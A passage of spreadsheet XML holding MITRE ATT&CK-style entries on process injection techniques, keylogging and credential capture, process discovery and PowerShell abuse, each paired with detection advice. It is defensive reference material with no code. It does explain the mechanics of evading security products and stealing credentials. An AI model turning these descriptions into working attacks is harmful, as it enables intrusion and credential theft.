  </si>
  <si>
    <t>T1055.004</t>
  </si>
  <si>
    <t>Asynchronous Procedure Call (T1055.004)</t>
  </si>
  <si>
    <t xml:space="preserve">Adversaries may inject malicious code into processes via the asynchronous procedure call (APC) queue in order to evade process-based defenses as well as possibly elevate privileges. APC injection is a method of executing arbitrary code in the address space of a separate live process. 
APC injection is commonly performed by attaching malicious code to the APC Queue (Citation: Microsoft APC) of a process's thread. Queued APC functions are executed when the thread enters an alterable state.(Citation: Microsoft APC) A handle to an existing victim process is first created with native Windows API calls such as &lt;code&gt;OpenThread&lt;/code&gt;. At this point &lt;code&gt;QueueUserAPC&lt;/code&gt; can be used to invoke a function (such as &lt;code&gt;LoadLibrayA&lt;/code&gt; pointing to a malicious DLL). 
A variation of APC injection, dubbed "Early Bird injection", involves creating a suspended process in which malicious code can be written and executed before the process' entry point (and potentially subsequent anti-malware hooks) via an APC. (Citation: CyberBit Early Bird Apr 2018) AtomBombing (Citation: ENSIL AtomBombing Oct 2016) is another variation that utilizes APCs to invoke malicious code previously written to the global atom table.(Citation: Microsoft Atom Table)
Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via APC injection may also evade detection from security products since the execution is masked under a legitimate process. </t>
  </si>
  <si>
    <t xml:space="preserve">Monitoring Windows API calls indicative of the various types of code injection may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances for known bad sequences of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. Windows API calls such as &lt;code&gt;SuspendThread&lt;/code&gt;/&lt;code&gt;SetThreadContext&lt;/code&gt;/&lt;code&gt;ResumeThread&lt;/code&gt;, &lt;code&gt;QueueUserAPC&lt;/code&gt;/&lt;code&gt;NtQueueApcThread&lt;/code&gt;, and those that can be used to modify memory within another process, such as &lt;code&gt;VirtualAllocEx&lt;/code&gt;/&lt;code&gt;WriteProcessMemory&lt;/code&gt;, may be used for this technique.(Citation: Elastic Process Injection July 2017)
Analyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior. </t>
  </si>
  <si>
    <t>T1055.005</t>
  </si>
  <si>
    <t>Thread Local Storage (T1055.005)</t>
  </si>
  <si>
    <t xml:space="preserve">Adversaries may inject malicious code into processes via thread local storage (TLS) callbacks in order to evade process-based defenses as well as possibly elevate privileges. TLS callback injection is a method of executing arbitrary code in the address space of a separate live process. 
TLS callback injection involves manipulating pointers inside a portable executable (PE) to redirect a process to malicious code before reaching the code's legitimate entry point. TLS callbacks are normally used by the OS to setup and/or cleanup data used by threads. Manipulating TLS callbacks may be performed by allocating and writing to specific offsets within a process’ memory space using other [Process Injection](https://attack.mitre.org/techniques/T1055) techniques such as [Process Hollowing](https://attack.mitre.org/techniques/T1055/012).(Citation: FireEye TLS Nov 2017)
Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via TLS callback injection may also evade detection from security products since the execution is masked under a legitimate process. </t>
  </si>
  <si>
    <t>T1055.008</t>
  </si>
  <si>
    <t>Ptrace System Calls (T1055.008)</t>
  </si>
  <si>
    <t xml:space="preserve">Adversaries may inject malicious code into processes via ptrace (process trace) system calls in order to evade process-based defenses as well as possibly elevate privileges. Ptrace system call injection is a method of executing arbitrary code in the address space of a separate live process. 
Ptrace system call injection involves attaching to and modifying a running process. The ptrace system call enables a debugging process to observe and control another process (and each individual thread), including changing memory and register values.(Citation: PTRACE man) Ptrace system call injection is commonly performed by writing arbitrary code into a running process (ex: &lt;code&gt;malloc&lt;/code&gt;) then invoking that memory with &lt;code&gt;PTRACE_SETREGS&lt;/code&gt; to set the register containing the next instruction to execute. Ptrace system call injection can also be done with &lt;code&gt;PTRACE_POKETEXT&lt;/code&gt;/&lt;code&gt;PTRACE_POKEDATA&lt;/code&gt;, which copy data to a specific address in the target processes’ memory (ex: the current address of the next instruction). (Citation: PTRACE man)(Citation: Medium Ptrace JUL 2018) 
Ptrace system call injection may not be possible targeting processes that are non-child processes and/or have higher-privileges.(Citation: BH Linux Inject) 
Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via ptrace system call injection may also evade detection from security products since the execution is masked under a legitimate process. </t>
  </si>
  <si>
    <t xml:space="preserve">Monitoring for Linux specific calls such as the ptrace system call should not generate large amounts of data due to their specialized nature, and can be a very effective method to detect some of the common process injection methods.(Citation: ArtOfMemoryForensics)  (Citation: GNU Acct)  (Citation: RHEL auditd)  (Citation: Chokepoint preload rootkits) 
Analyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior. </t>
  </si>
  <si>
    <t>T1055.009</t>
  </si>
  <si>
    <t>Proc Memory (T1055.009)</t>
  </si>
  <si>
    <t>File: File Modification</t>
  </si>
  <si>
    <t xml:space="preserve">Adversaries may inject malicious code into processes via the /proc filesystem in order to evade process-based defenses as well as possibly elevate privileges. Proc memory injection is a method of executing arbitrary code in the address space of a separate live process. 
Proc memory injection involves enumerating the memory of a process via the /proc filesystem (&lt;code&gt;/proc/[pid]&lt;/code&gt;) then crafting a return-oriented programming (ROP) payload with available gadgets/instructions. Each running process has its own directory, which includes memory mappings. Proc memory injection is commonly performed by overwriting the target processes’ stack using memory mappings provided by the /proc filesystem. This information can be used to enumerate offsets (including the stack) and gadgets (or instructions within the program that can be used to build a malicious payload) otherwise hidden by process memory protections such as address space layout randomization (ASLR). Once enumerated, the target processes’ memory map within &lt;code&gt;/proc/[pid]/maps&lt;/code&gt; can be overwritten using dd.(Citation: Uninformed Needle)(Citation: GDS Linux Injection)(Citation: DD Man) 
Other techniques such as [Dynamic Linker Hijacking](https://attack.mitre.org/techniques/T1574/006) may be used to populate a target process with more available gadgets. Similar to [Process Hollowing](https://attack.mitre.org/techniques/T1055/012), proc memory injection may target child processes (such as a backgrounded copy of sleep).(Citation: GDS Linux Injection) 
Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via proc memory injection may also evade detection from security products since the execution is masked under a legitimate process. </t>
  </si>
  <si>
    <t xml:space="preserve">File system monitoring can determine if /proc files are being modified. Users should not have permission to modify these in most cases. 
Analyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior. </t>
  </si>
  <si>
    <t>T1055.011</t>
  </si>
  <si>
    <t>Extra Window Memory Injection (T1055.011)</t>
  </si>
  <si>
    <t>Process: OS API Execution</t>
  </si>
  <si>
    <t xml:space="preserve">Adversaries may inject malicious code into process via Extra Window Memory (EWM) in order to evade process-based defenses as well as possibly elevate privileges. EWM injection is a method of executing arbitrary code in the address space of a separate live process. 
Before creating a window, graphical Windows-based processes must prescribe to or register a windows class, which stipulate appearance and behavior (via windows procedures, which are functions that handle input/output of data).(Citation: Microsoft Window Classes) Registration of new windows classes can include a request for up to 40 bytes of EWM to be appended to the allocated memory of each instance of that class. This EWM is intended to store data specific to that window and has specific application programming interface (API) functions to set and get its value. (Citation: Microsoft GetWindowLong function) (Citation: Microsoft SetWindowLong function)
Although small, the EWM is large enough to store a 32-bit pointer and is often used to point to a windows procedure. Malware may possibly utilize this memory location in part of an attack chain that includes writing code to shared sections of the process’s memory, placing a pointer to the code in EWM, then invoking execution by returning execution control to the address in the process’s EWM.
Execution granted through EWM injection may allow access to both the target process's memory and possibly elevated privileges. Writing payloads to shared sections also avoids the use of highly monitored API calls such as &lt;code&gt;WriteProcessMemory&lt;/code&gt; and &lt;code&gt;CreateRemoteThread&lt;/code&gt;.(Citation: Elastic Process Injection July 2017) More sophisticated malware samples may also potentially bypass protection mechanisms such as data execution prevention (DEP) by triggering a combination of windows procedures and other system functions that will rewrite the malicious payload inside an executable portion of the target process.  (Citation: MalwareTech Power Loader Aug 2013) (Citation: WeLiveSecurity Gapz and Redyms Mar 2013)
Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via EWM injection may also evade detection from security products since the execution is masked under a legitimate process. </t>
  </si>
  <si>
    <t>Monitor for API calls related to enumerating and manipulating EWM such as GetWindowLong (Citation: Microsoft GetWindowLong function) and SetWindowLong (Citation: Microsoft SetWindowLong function). Malware associated with this technique have also used SendNotifyMessage (Citation: Microsoft SendNotifyMessage function) to trigger the associated window procedure and eventual malicious injection. (Citation: Elastic Process Injection July 2017)</t>
  </si>
  <si>
    <t>T1055.012</t>
  </si>
  <si>
    <t>Process Hollowing (T1055.012)</t>
  </si>
  <si>
    <t>Process: OS API Execution, Process: Process Access, Process: Process Creation, Process: Process Modification</t>
  </si>
  <si>
    <t xml:space="preserve">Adversaries may inject malicious code into suspended and hollowed processes in order to evade process-based defenses. Process hollowing is a method of executing arbitrary code in the address space of a separate live process.  
Process hollowing is commonly performed by creating a process in a suspended state then unmapping/hollowing its memory, which can then be replaced with malicious code. A victim process can be created with native Windows API calls such as &lt;code&gt;CreateProcess&lt;/code&gt;, which includes a flag to suspend the processes primary thread. At this point the process can be unmapped using APIs calls such as &lt;code&gt;ZwUnmapViewOfSection&lt;/code&gt; or &lt;code&gt;NtUnmapViewOfSection&lt;/code&gt;  before being written to, realigned to the injected code, and resumed via &lt;code&gt;VirtualAllocEx&lt;/code&gt;, &lt;code&gt;WriteProcessMemory&lt;/code&gt;, &lt;code&gt;SetThreadContext&lt;/code&gt;, then &lt;code&gt;ResumeThread&lt;/code&gt; respectively.(Citation: Leitch Hollowing)(Citation: Elastic Process Injection July 2017)
This is very similar to [Thread Local Storage](https://attack.mitre.org/techniques/T1055/005) but creates a new process rather than targeting an existing process. This behavior will likely not result in elevated privileges since the injected process was spawned from (and thus inherits the security context) of the injecting process. However, execution via process hollowing may also evade detection from security products since the execution is masked under a legitimate process. </t>
  </si>
  <si>
    <t>Monitoring Windows API calls indicative of the various types of code injection may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances for known bad sequences of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. Windows API calls such as &lt;code&gt;CreateRemoteThread&lt;/code&gt;, &lt;code&gt;SuspendThread&lt;/code&gt;/&lt;code&gt;SetThreadContext&lt;/code&gt;/&lt;code&gt;ResumeThread&lt;/code&gt;, and those that can be used to modify memory within another process, such as &lt;code&gt;VirtualAllocEx&lt;/code&gt;/&lt;code&gt;WriteProcessMemory&lt;/code&gt;, may be used for this technique.(Citation: Elastic Process Injection July 2017)
Processing hollowing commonly involves spawning an otherwise benign victim process. Consider correlating detections of processes created in a suspended state (ex: through API flags or process’ thread metadata) with other malicious activity such as attempts to modify a process' memory, especially by its parent process, or other abnormal process behavior.(Citation: Nviso Spoof Command Line 2020)(Citation: Mandiant Endpoint Evading 2019)
Analyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior.</t>
  </si>
  <si>
    <t>T1055.013</t>
  </si>
  <si>
    <t>Process Doppelgänging (T1055.013)</t>
  </si>
  <si>
    <t>File: File Metadata, Process: OS API Execution</t>
  </si>
  <si>
    <t xml:space="preserve">Adversaries may inject malicious code into process via process doppelgänging in order to evade process-based defenses as well as possibly elevate privileges. Process doppelgänging is a method of executing arbitrary code in the address space of a separate live process. 
Windows Transactional NTFS (TxF) was introduced in Vista as a method to perform safe file operations. (Citation: Microsoft TxF) To ensure data integrity, TxF enables only one transacted handle to write to a file at a given time. Until the write handle transaction is terminated, all other handles are isolated from the writer and may only read the committed version of the file that existed at the time the handle was opened. (Citation: Microsoft Basic TxF Concepts) To avoid corruption, TxF performs an automatic rollback if the system or application fails during a write transaction. (Citation: Microsoft Where to use TxF)
Although deprecated, the TxF application programming interface (API) is still enabled as of Windows 10. (Citation: BlackHat Process Doppelgänging Dec 2017)
Adversaries may abuse TxF to a perform a file-less variation of [Process Injection](https://attack.mitre.org/techniques/T1055). Similar to [Process Hollowing](https://attack.mitre.org/techniques/T1055/012), process doppelgänging involves replacing the memory of a legitimate process, enabling the veiled execution of malicious code that may evade defenses and detection. Process doppelgänging's use of TxF also avoids the use of highly-monitored API functions such as &lt;code&gt;NtUnmapViewOfSection&lt;/code&gt;, &lt;code&gt;VirtualProtectEx&lt;/code&gt;, and &lt;code&gt;SetThreadContext&lt;/code&gt;. (Citation: BlackHat Process Doppelgänging Dec 2017)
Process Doppelgänging is implemented in 4 steps (Citation: BlackHat Process Doppelgänging Dec 2017):
* Transact – Create a TxF transaction using a legitimate executable then overwrite the file with malicious code. These changes will be isolated and only visible within the context of the transaction.
* Load – Create a shared section of memory and load the malicious executable.
* Rollback – Undo changes to original executable, effectively removing malicious code from the file system.
* Animate – Create a process from the tainted section of memory and initiate execution.
This behavior will likely not result in elevated privileges since the injected process was spawned from (and thus inherits the security context) of the injecting process. However, execution via process doppelgänging may evade detection from security products since the execution is masked under a legitimate process. </t>
  </si>
  <si>
    <t>Monitor and analyze calls to &lt;code&gt;CreateTransaction&lt;/code&gt;, &lt;code&gt;CreateFileTransacted&lt;/code&gt;, &lt;code&gt;RollbackTransaction&lt;/code&gt;, and other rarely used functions indicative of TxF activity. Process Doppelgänging also invokes an outdated and undocumented implementation of the Windows process loader via calls to &lt;code&gt;NtCreateProcessEx&lt;/code&gt; and &lt;code&gt;NtCreateThreadEx&lt;/code&gt; as well as API calls used to modify memory within another process, such as &lt;code&gt;WriteProcessMemory&lt;/code&gt;. (Citation: BlackHat Process Doppelgänging Dec 2017) (Citation: hasherezade Process Doppelgänging Dec 2017)
Scan file objects reported during the PsSetCreateProcessNotifyRoutine, (Citation: Microsoft PsSetCreateProcessNotifyRoutine routine) which triggers a callback whenever a process is created or deleted, specifically looking for file objects with enabled write access. (Citation: BlackHat Process Doppelgänging Dec 2017) Also consider comparing file objects loaded in memory to the corresponding file on disk. (Citation: hasherezade Process Doppelgänging Dec 2017)
Analyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior.</t>
  </si>
  <si>
    <t>T1055.014</t>
  </si>
  <si>
    <t>VDSO Hijacking (T1055.014)</t>
  </si>
  <si>
    <t>Module: Module Load, Process: OS API Execution</t>
  </si>
  <si>
    <t xml:space="preserve">Adversaries may inject malicious code into processes via VDSO hijacking in order to evade process-based defenses as well as possibly elevate privileges. Virtual dynamic shared object (vdso) hijacking is a method of executing arbitrary code in the address space of a separate live process. 
VDSO hijacking involves redirecting calls to dynamically linked shared libraries. Memory protections may prevent writing executable code to a process via [Ptrace System Calls](https://attack.mitre.org/techniques/T1055/008). However, an adversary may hijack the syscall interface code stubs mapped into a process from the vdso shared object to execute syscalls to open and map a malicious shared object. This code can then be invoked by redirecting the execution flow of the process via patched memory address references stored in a process' global offset table (which store absolute addresses of mapped library functions).(Citation: ELF Injection May 2009)(Citation: Backtrace VDSO)(Citation: VDSO Aug 2005)(Citation: Syscall 2014)
Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via VDSO hijacking may also evade detection from security products since the execution is masked under a legitimate process.  </t>
  </si>
  <si>
    <t xml:space="preserve">Monitor for malicious usage of system calls, such as ptrace and mmap, that can be used to attach to, manipulate memory, then redirect a processes' execution path. Monitoring for Linux specific calls such as the ptrace system call should not generate large amounts of data due to their specialized nature, and can be a very effective method to detect some of the common process injection methods.(Citation: ArtOfMemoryForensics)(Citation: GNU Acct)(Citation: RHEL auditd)(Citation: Chokepoint preload rootkits) 
Analyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior. </t>
  </si>
  <si>
    <t>T1055.015</t>
  </si>
  <si>
    <t>ListPlanting (T1055.015)</t>
  </si>
  <si>
    <t>Process: OS API Execution, Process: Process Modification</t>
  </si>
  <si>
    <t>Adversaries may abuse list-view controls to inject malicious code into hijacked processes in order to evade process-based defenses as well as possibly elevate privileges. ListPlanting is a method of executing arbitrary code in the address space of a separate live process.(Citation: Hexacorn Listplanting) Code executed via ListPlanting may also evade detection from security products since the execution is masked under a legitimate process.
List-view controls are user interface windows used to display collections of items.(Citation: Microsoft List View Controls) Information about an application's list-view settings are stored within the process' memory in a &lt;code&gt;SysListView32&lt;/code&gt; control.
ListPlanting (a form of message-passing "shatter attack") may be performed by copying code into the virtual address space of a process that uses a list-view control then using that code as a custom callback for sorting the listed items.(Citation: Modexp Windows Process Injection) Adversaries must first copy code into the target process’ memory space, which can be performed various ways including by directly obtaining a handle to the &lt;code&gt;SysListView32&lt;/code&gt; child of the victim process window (via Windows API calls such as &lt;code&gt;FindWindow&lt;/code&gt; and/or &lt;code&gt;EnumWindows&lt;/code&gt;) or other [Process Injection](https://attack.mitre.org/techniques/T1055) methods.
Some variations of ListPlanting may allocate memory in the target process but then use window messages to copy the payload, to avoid the use of the highly monitored &lt;code&gt;WriteProcessMemory&lt;/code&gt; function. For example, an adversary can use the &lt;code&gt;PostMessage&lt;/code&gt; and/or &lt;code&gt;SendMessage&lt;/code&gt; API functions to send &lt;code&gt;LVM_SETITEMPOSITION&lt;/code&gt; and &lt;code&gt;LVM_GETITEMPOSITION&lt;/code&gt; messages, effectively copying a payload 2 bytes at a time to the allocated memory.(Citation: ESET InvisiMole June 2020) 
Finally, the payload is triggered by sending the &lt;code&gt;LVM_SORTITEMS&lt;/code&gt; message to the &lt;code&gt;SysListView32&lt;/code&gt; child of the process window, with the payload within the newly allocated buffer passed and executed as the &lt;code&gt;ListView_SortItems&lt;/code&gt; callback.</t>
  </si>
  <si>
    <t xml:space="preserve">Monitoring Windows API calls indicative of the various types of code injection may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances for known bad sequences of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. Windows API calls such as &lt;code&gt;FindWindow&lt;/code&gt;, &lt;code&gt;FindWindowEx&lt;/code&gt;, &lt;code&gt;EnumWindows&lt;/code&gt;, &lt;code&gt;EnumChildWindows&lt;/code&gt;, and those that can be used to modify memory within another process, such as &lt;code&gt;VirtualAllocEx&lt;/code&gt;/&lt;code&gt;WriteProcessMemory&lt;/code&gt;, may be abused for this technique. 
Consider monitoring for excessive use of &lt;code&gt;SendMessage&lt;/code&gt; and/or &lt;code&gt;PostMessage&lt;/code&gt; API functions with &lt;code&gt;LVM_SETITEMPOSITION&lt;/code&gt; and/or &lt;code&gt;LVM_GETITEMPOSITION&lt;/code&gt; arguments.
Analyze process behavior to determine if a process is performing unusual actions, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior. </t>
  </si>
  <si>
    <t>T1056</t>
  </si>
  <si>
    <t>Collection, Credential Access</t>
  </si>
  <si>
    <t>Driver: Driver Load, File: File Modification, Process: OS API Execution, Process: Process Creation, Process: Process Metadata, Windows Registry: Windows Registry Key Modification</t>
  </si>
  <si>
    <t>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Hooking](https://attack.mitre.org/techniques/T1056/004)) or rely on deceiving the user into providing input into what they believe to be a genuine service (e.g. [Web Portal Capture](https://attack.mitre.org/techniques/T1056/003)).</t>
  </si>
  <si>
    <t>Detection may vary depending on how input is captured but may include monitoring for certain Windows API calls (e.g. `SetWindowsHook`, `GetKeyState`, and `GetAsyncKeyState`)(Citation: Adventures of a Keystroke), monitoring for malicious instances of [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059), and ensuring no unauthorized drivers or kernel modules that could indicate keylogging or API hooking are present.</t>
  </si>
  <si>
    <t>T1056.001</t>
  </si>
  <si>
    <t>Driver: Driver Load, Process: OS API Execution, Windows Registry: Windows Registry Key Modification</t>
  </si>
  <si>
    <t xml:space="preserve">Adversaries may log user keystrokes to intercept credentials as the user types them. Keylogging is likely to be used to acquire credentials for new access opportunities when [OS Credential Dumping](https://attack.mitre.org/techniques/T1003) efforts are not effective, and may require an adversary to intercept keystrokes on a system for a substantial period of time before credentials can be successfully captured. In order to increase the likelihood of capturing credentials quickly, an adversary may also perform actions such as clearing browser cookies to force users to reauthenticate to systems.(Citation: Talos Kimsuky Nov 2021)
Keylogging is the most prevalent type of input capture, with many different ways of intercepting keystrokes.(Citation: Adventures of a Keystroke) Some methods include:
* Hooking API callbacks used for processing keystrokes. Unlike [Credential API Hooking](https://attack.mitre.org/techniques/T1056/004), this focuses solely on API functions intended for processing keystroke data.
* Reading raw keystroke data from the hardware buffer.
* Windows Registry modifications.
* Custom drivers.
* [Modify System Image](https://attack.mitre.org/techniques/T1601) may provide adversaries with hooks into the operating system of network devices to read raw keystrokes for login sessions.(Citation: Cisco Blog Legacy Device Attacks) </t>
  </si>
  <si>
    <t>Keyloggers may take many forms, possibly involving modification to the Registry and installation of a driver, setting a hook, or polling to intercept keystrokes. Commonly used API calls include `SetWindowsHook`, `GetKeyState`, and `GetAsyncKeyState`.(Citation: Adventures of a Keystroke) Monitor the Registry and file system for such changes, monitor driver installs, and look for common keylogging API calls. API calls alone are not an indicator of keylogging, but may provide behavioral data that is useful when combined with other information such as new files written to disk and unusual processes.</t>
  </si>
  <si>
    <t>T1056.002</t>
  </si>
  <si>
    <t>Command: Command Execution, Process: Process Creation, Script: Script Execution</t>
  </si>
  <si>
    <t>Adversaries may mimic common operating system GUI components to prompt users for credentials with a seemingly legitimate prompt. When programs are executed that need additional privileges than are present in the current user context, it is common for the operating system to prompt the user for proper credentials to authorize the elevated privileges for the task (ex: [Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002)).
Adversaries may mimic this functionality to prompt users for credentials with a seemingly legitimate prompt for a number of reasons that mimic normal usage, such as a fake installer requiring additional access or a fake malware removal suite.(Citation: OSX Malware Exploits MacKeeper) This type of prompt can be used to collect credentials via various languages such as [AppleScript](https://attack.mitre.org/techniques/T1059/002)(Citation: LogRhythm Do You Trust Oct 2014)(Citation: OSX Keydnap malware)(Citation: Spoofing credential dialogs) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).(Citation: LogRhythm Do You Trust Oct 2014)(Citation: Enigma Phishing for Credentials Jan 2015)(Citation: Spoofing credential dialogs) On Linux systems adversaries may launch dialog boxes prompting users for credentials from malicious shell scripts or the command line (i.e. [Unix Shell](https://attack.mitre.org/techniques/T1059/004)).(Citation: Spoofing credential dialogs)
Adversaries may also mimic common software authentication requests, such as those from browsers or email clients. This may also be paired with user activity monitoring (i.e., [Browser Information Discovery](https://attack.mitre.org/techniques/T1217) and/or [Application Window Discovery](https://attack.mitre.org/techniques/T1010)) to spoof prompts when users are naturally accessing sensitive sites/data.</t>
  </si>
  <si>
    <t xml:space="preserve">Monitor process execution for unusual programs as well as malicious instances of [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059) that could be used to prompt users for credentials. For example, command/script history including abnormal parameters (such as requests for credentials and/or strings related to creating password prompts) may be malicious.(Citation: Spoofing credential dialogs) 
Inspect and scrutinize input prompts for indicators of illegitimacy, such as non-traditional banners, text, timing, and/or sources. </t>
  </si>
  <si>
    <t>T1056.003</t>
  </si>
  <si>
    <t>Web Portal Capture (T1056.003)</t>
  </si>
  <si>
    <t>Adversaries may install code on externally facing portals, such as a VPN login page, to capture and transmit credentials of users who attempt to log into the service. For example, a compromised login page may log provided user credentials before logging the user in to the service.
This variation on input capture may be conducted post-compromise using legitimate administrative access as a backup measure to maintain network access through [External Remote Services](https://attack.mitre.org/techniques/T1133) and [Valid Accounts](https://attack.mitre.org/techniques/T1078) or as part of the initial compromise by exploitation of the externally facing web service.(Citation: Volexity Virtual Private Keylogging)</t>
  </si>
  <si>
    <t>File monitoring may be used to detect changes to files in the Web directory for organization login pages that do not match with authorized updates to the Web server's content.</t>
  </si>
  <si>
    <t>T1056.004</t>
  </si>
  <si>
    <t>Process: OS API Execution, Process: Process Metadata</t>
  </si>
  <si>
    <t xml:space="preserve">Adversaries may hook into Windows application programming interface (API) functions to collect user credentials. Malicious hooking mechanisms may capture API calls that include parameters that reveal user authentication credentials.(Citation: Microsoft TrojanSpy:Win32/Ursnif.gen!I Sept 2017) Unlike [Keylogging](https://attack.mitre.org/techniques/T1056/001),  this technique focuses specifically on API functions that include parameters that reveal user credentials. Hooking involves redirecting calls to these functions and can be implemented via:
* **Hooks procedures**, which intercept and execute designated code in response to events such as messages, keystrokes, and mouse inputs.(Citation: Microsoft Hook Overview)(Citation: Elastic Process Injection July 2017)
* **Import address table (IAT) hooking**, which use modifications to a process’s IAT, where pointers to imported API functions are stored.(Citation: Elastic Process Injection July 2017)(Citation: Adlice Software IAT Hooks Oct 2014)(Citation: MWRInfoSecurity Dynamic Hooking 2015)
* **Inline hooking**, which overwrites the first bytes in an API function to redirect code flow.(Citation: Elastic Process Injection July 2017)(Citation: HighTech Bridge Inline Hooking Sept 2011)(Citation: MWRInfoSecurity Dynamic Hooking 2015)
</t>
  </si>
  <si>
    <t>Monitor for calls to the `SetWindowsHookEx` and `SetWinEventHook` functions, which install a hook procedure.(Citation: Microsoft Hook Overview)(Citation: Volatility Detecting Hooks Sept 2012) Also consider analyzing hook chains (which hold pointers to hook procedures for each type of hook) using tools(Citation: Volatility Detecting Hooks Sept 2012)(Citation: PreKageo Winhook Jul 2011)(Citation: Jay GetHooks Sept 2011) or by programmatically examining internal kernel structures.(Citation: Zairon Hooking Dec 2006)(Citation: EyeofRa Detecting Hooking June 2017)
Rootkits detectors(Citation: GMER Rootkits) can also be used to monitor for various types of hooking activity.
Verify integrity of live processes by comparing code in memory to that of corresponding static binaries, specifically checking for jumps and other instructions that redirect code flow. Also consider taking snapshots of newly started processes(Citation: Microsoft Process Snapshot) to compare the in-memory IAT to the real addresses of the referenced functions.(Citation: StackExchange Hooks Jul 2012)(Citation: Adlice Software IAT Hooks Oct 2014)</t>
  </si>
  <si>
    <t>T1057</t>
  </si>
  <si>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On network devices, [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `show processes` can be used to display current running processes.(Citation: US-CERT-TA18-106A)(Citation: show_processes_cisco_cmd)</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</si>
  <si>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that look like process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for `show` commands being run by non-standard users from non-standard locations.</t>
  </si>
  <si>
    <t>T1059</t>
  </si>
  <si>
    <t>Command: Command Execution, Module: Module Load, Process: Process Creation, Process: Process Metadata, Script: Script Execution</t>
  </si>
  <si>
    <t>IaaS, Identity Provider, Linux, Network, Office Suite, Windows, macOS</t>
  </si>
  <si>
    <t>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Shell](https://attack.mitre.org/techniques/T1059/004) while Windows installations include the [Windows Command Shell](https://attack.mitre.org/techniques/T1059/003) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).
There are also cross-platform interpreters such as [Python](https://attack.mitre.org/techniques/T1059/006), as well as those commonly associated with client applications such as [JavaScript](https://attack.mitre.org/techniques/T1059/007) and [Visual Basic](https://attack.mitre.org/techniques/T1059/005).
Adversaries may abuse these technologies in various ways as a means of executing arbitrary commands. Commands and scripts can be embedded in [Initial Access](https://attack.mitre.org/tactics/TA0001) payloads delivered to victims as lure documents or as secondary payloads downloaded from an existing C2. Adversaries may also execute commands through interactive terminals/shells, as well as utilize various [Remote Services](https://attack.mitre.org/techniques/T1021) in order to achieve remote Execution.(Citation: Powershell Remote Commands)(Citation: Cisco IOS Software Integrity Assurance - Command History)(Citation: Remote Shell Execution in Python)</t>
  </si>
  <si>
    <t>Command-line and scripting activities can be captured through proper logging of process execution with command-line arguments. This information can be useful in gaining additional insight to adversaries' actions through how they use native processes or custom tools. Also monitor for loading of modules associated with specific languages.
If scripting is restricted for normal users, then any attempt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
Scripts are likely to perform actions with various effects on a system that may generate events, depending on the types of monitoring used. Monitor processes and command-line arguments for script execution and subsequent behavior. Actions may be related to network and system information discovery, collection, or other scriptable post-compromise behaviors and could be used as indicators of detection leading back to the source script.</t>
  </si>
  <si>
    <t>T1059.001</t>
  </si>
  <si>
    <t>Adversaries may abuse PowerShell commands and scripts for execution. PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system.(Citation: TechNet PowerShell) Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the &lt;code&gt;Start-Process&lt;/code&gt; cmdlet which can be used to run an executable and the &lt;code&gt;Invoke-Command&lt;/code&gt; cmdlet which runs a command locally or on a remote computer (though administrator permissions are required to use PowerShell to connect to remote systems).
PowerShell may also be used to download and run executables from the Internet, which can be executed from disk or in memory without touching disk.
A number of PowerShell-based offensive testing tools are available, including [Empire](https://attack.mitre.org/software/S0363),  [PowerSploit](https://attack.mitre.org/software/S0194), [PoshC2](https://attack.mitre.org/software/S0378), and PSAttack.(Citation: Github PSAttack)
PowerShell commands/scripts can also be executed without directly invoking the &lt;code&gt;powershell.exe&lt;/code&gt; binary through interfaces to PowerShell's underlying &lt;code&gt;System.Management.Automation&lt;/code&gt; assembly DLL exposed through the .NET framework and Windows Common Language Interface (CLI).(Citation: Sixdub PowerPick Jan 2016)(Citation: SilentBreak Offensive PS Dec 2015)(Citation: Microsoft PSfromCsharp APR 2014)</t>
  </si>
  <si>
    <t>If proper execution policy is set, adversaries will likely be able to define their own execution policy if they obtain administrator or system access, either through the Registry or at the command line. This change in policy on a system may be a way to detect malicious use of PowerShell. If PowerShell is not used in an environment, then simply looking for PowerShell execution may detect malicious activity.
Monitor for loading and/or execution of artifacts associated with PowerShell specific assemblies, such as System.Management.Automation.dll (especially to unusual process names/locations).(Citation: Sixdub PowerPick Jan 2016)(Citation: SilentBreak Offensive PS Dec 2015)
It is also beneficial to turn on PowerShell logging to gain increased fidelity in what occurs during execution (which is applied to .NET invocations). (Citation: Malware Archaeology PowerShell Cheat Sheet) PowerShell 5.0 introduced enhanced logging capabilities, and some of those features have since been added to PowerShell 4.0. Earlier versions of PowerShell do not have many logging features.(Citation: FireEye PowerShell Logging 2016) An organization can gather PowerShell execution details in a data analytic platform to supplement it with other data.
